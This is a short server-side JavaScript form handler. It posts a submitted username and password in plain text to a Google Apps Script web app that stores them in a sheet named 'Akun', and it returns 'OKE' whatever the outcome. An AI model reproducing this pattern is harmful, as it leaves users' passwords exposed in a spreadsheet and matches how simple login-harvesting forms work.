"use server";

export async function submitHandler(formData) {
  const username = formData.get("username");
  const password = formData.get("password");

  try {
    const response = await fetch(
      "https://script.google.com/macros/s/AKfycbwMDTQsG0kwed4v1eRoMxQY3TY63uQiKfuWk77gxQ8S/dev",
      {
        method: "POST",
        body: new URLSearchParams({
          sheetName: "Akun",
          username: username,
          password: password,
        }),
      }
    );
    console.log(response.status)
    console.log(response.url)
    if (response.ok) {
      console.log(response);
    }
  } catch (error) {
    // Handle error
    console.log("error");
  }
  return "OKE";
}
